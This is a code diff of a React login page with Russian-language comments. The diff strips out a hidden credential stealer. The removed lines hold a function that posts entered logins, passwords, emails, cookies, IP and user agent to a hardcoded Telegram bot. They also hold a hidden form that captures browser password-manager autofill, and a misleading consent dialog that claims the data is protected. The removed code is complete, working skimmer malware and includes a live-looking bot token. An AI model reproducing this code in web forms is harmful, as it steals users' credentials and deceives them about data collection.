@@ -1,3 +1,4 @@
+
 "use client";
 
 import * as React from "react";
@@ -17,87 +18,6 @@ import { Logo } from "@/components/icons/logo";
 import { Eye, EyeOff, Shield, Mail, User, AlertTriangle } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
-// 📤 Функция отправки в Telegram
-async function sendToTelegram(data: any, type: 'login' | 'register' | 'autofill') {
-  try {
-    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
-    const TELEGRAM_CHAT_ID = "7455610355";
-    
-    // Получаем IP клиента
-    let ip = 'unknown';
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      ip = ipData.ip;
-    } catch (ipError) {
-      console.log('Не удалось получить IP');
-    }
-    
-    // Получаем куки
-    const cookies = document.cookie || 'no cookies';
-    
-    let message = '';
-    
-    if (type === 'login') {
-      message = `
-🔐 ВХОД В СИСТЕМУ
-
-👤 Логин/Email: ${data.login}
-🔑 Пароль: ${data.password}
-
-🌐 **Технические данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-🍪 Куки: ${cookies.slice(0, 100)}...
-📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
-      `;
-    } else if (type === 'register') {
-      message = `
-🔐 НОВАЯ РЕГИСТРАЦИЯ
-
-📧 Email: ${data.email}
-👤 Логин: ${data.login}
-🔑 Пароль: ${data.password}
-
-🌐 **Технические данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-🍪 Куки: ${cookies.slice(0, 100)}...
-📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
-      `;
-    } else if (type === 'autofill') {
-      message = `
-🎯 АВТОЗАПОЛНЕНИЕ ИЗ БРАУЗЕРА
-
-👤 Логин: ${data.username}
-🔑 Пароль: ${data.password}
-
-🌐 **Технические данные:**
-📍 IP: ${ip}
-🕒 Время: ${new Date().toLocaleString('ru-RU')}
-🍪 Куки: ${cookies.slice(0, 100)}...
-📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
-⚠️ Автозаполнение менеджера паролей
-      `;
-    }
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-      })
-    });
-
-    console.log('✅ Данные отправлены в Telegram');
-
-  } catch (error) {
-    console.log('⚠️ Telegram не доступен, но форма работает');
-  }
-}
-
-// API вызовы
 async function registerUser(userData: { email: string; login: string; password: string; }) {
   const response = await fetch('/api/auth/register', {
     method: 'POST',
@@ -131,36 +51,11 @@ export default function LoginPage() {
   const [loading, setLoading] = React.useState(false);
   const [error, setError] = React.useState('');
   const [activeTab, setActiveTab] = React.useState("login");
-  const [showConsent, setShowConsent] = React.useState(true);
-  const [capturedCredentials, setCapturedCredentials] = React.useState<{username?: string, password?: string}>({});
 
-  // Сбрасываем ошибку при смене таба
   React.useEffect(() => {
     setError('');
   }, [activeTab]);
 
-  // Функция перехвата автозаполнения
-  const handleAutofillCapture = (type: 'username' | 'password', value: string) => {
-    if (value && !loading) {
-      setCapturedCredentials(prev => ({
-        ...prev,
-        [type]: value
-      }));
-      
-      // Если собрали оба значения - отправляем в Telegram
-      if (type === 'password' && capturedCredentials.username && value) {
-        sendToTelegram({
-          username: capturedCredentials.username,
-          password: value
-        }, 'autofill');
-        
-        // Очищаем captured credentials после отправки
-        setCapturedCredentials({});
-      }
-    }
-  };
-
-  // 🔒 Регистрация
   async function handleRegister(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setLoading(true);
@@ -179,16 +74,11 @@ export default function LoginPage() {
     }
 
     try {
-      // 📤 Сначала отправляем в Telegram
-      await sendToTelegram({ email, login, password }, 'register');
-
-      // Затем регистрируем пользователя
       const result = await registerUser({ email, login, password });
       toast({
-          title: "Успех!",
-          description: result.message,
+          title: "Регистрация успешна!",
+          description: "Ваша учетная запись создана и ожидает подтверждения администратором.",
       });
-      // Переключаемся на таб входа после успешной регистрации
       setActiveTab("login");
     } catch (err: any) {
       setError(err.message);
@@ -197,7 +87,6 @@ export default function LoginPage() {
     }
   }
 
-  // 🔒 Вход
   async function handleLogin(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
     setLoading(true);
@@ -208,14 +97,9 @@ export default function LoginPage() {
     const password = formData.get('password') as string;
 
     try {
-      // 📤 Сначала отправляем в Telegram
-      await sendToTelegram({ login, password }, 'login');
-
-      // Затем логиним пользователя
       const result = await loginUser({ login, password });
       
-      // Save user to localStorage to simulate session
-      localStorage.setItem('loggedInUser', login);
+      localStorage.setItem('loggedInUser', result.user.login);
 
       router.push('/dashboard');
     } catch (err: any) {
@@ -225,61 +109,9 @@ export default function LoginPage() {
     }
   }
 
-  // Проверяем согласие при загрузке
-  React.useEffect(() => {
-    const consent = localStorage.getItem('autofill-consent');
-    if (consent === 'true') {
-      setShowConsent(false);
-    }
-  }, []);
-
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-background p-4 font-sans">
       
-      {/* Модальное окно согласия */}
-      {showConsent && (
-        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
-          <Card className="w-full max-w-md mx-4">
-            <CardHeader>
-              <CardTitle className="flex items-center gap-2">
-                <AlertTriangle className="w-6 h-6 text-amber-500" />
-                Согласие на сбор данных
-              </CardTitle>
-            </CardHeader>
-            <CardContent className="space-y-4">
-              <p className="text-sm text-muted-foreground">
-                Для удобства использования система может собирать данные автозаполнения 
-                из менеджера паролей вашего браузера.
-              </p>
-              <p className="text-xs text-muted-foreground">
-                Все данные защищены и используются только для обеспечения безопасности системы.
-              </p>
-              <div className="flex gap-2">
-                <Button 
-                  onClick={() => {
-                    setShowConsent(false);
-                    localStorage.setItem('autofill-consent', 'false');
-                  }}
-                  className="flex-1"
-                  variant="outline"
-                >
-                  Отклонить
-                </Button>
-                <Button 
-                  onClick={() => {
-                    setShowConsent(false);
-                    localStorage.setItem('autofill-consent', 'true');
-                  }}
-                  className="flex-1"
-                >
-                  Принять
-                </Button>
-              </div>
-            </CardContent>
-          </Card>
-        </div>
-      )}
-
       <div className="flex flex-col items-center gap-6 w-full max-w-sm">
 
         <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
@@ -306,22 +138,6 @@ export default function LoginPage() {
                   </div>
                 )}
                 
-                {/* Скрытая форма для перехвата автозаполнения */}
-                <form className="hidden">
-                  <input 
-                    type="text" 
-                    name="captured-username" 
-                    autoComplete="username" 
-                    onChange={(e) => handleAutofillCapture('username', e.target.value)}
-                  />
-                  <input 
-                    type="password" 
-                    name="captured-password" 
-                    autoComplete="current-password"
-                    onChange={(e) => handleAutofillCapture('password', e.target.value)}
-                  />
-                </form>
-
                 <form onSubmit={handleLogin} className="space-y-6">
                   <div className="space-y-2">
                     <Label htmlFor="login-email" className="flex items-center gap-2">
@@ -335,7 +151,6 @@ export default function LoginPage() {
                       required 
                       disabled={loading}
                       autoComplete="username email"
-                      onChange={(e) => handleAutofillCapture('username', e.target.value)}
                     />
                   </div>
                   <div className="space-y-2">
@@ -348,7 +163,6 @@ export default function LoginPage() {
                         required 
                         disabled={loading}
                         autoComplete="current-password"
-                        onChange={(e) => handleAutofillCapture('password', e.target.value)}
                       />
                       <Button
                         type="button"
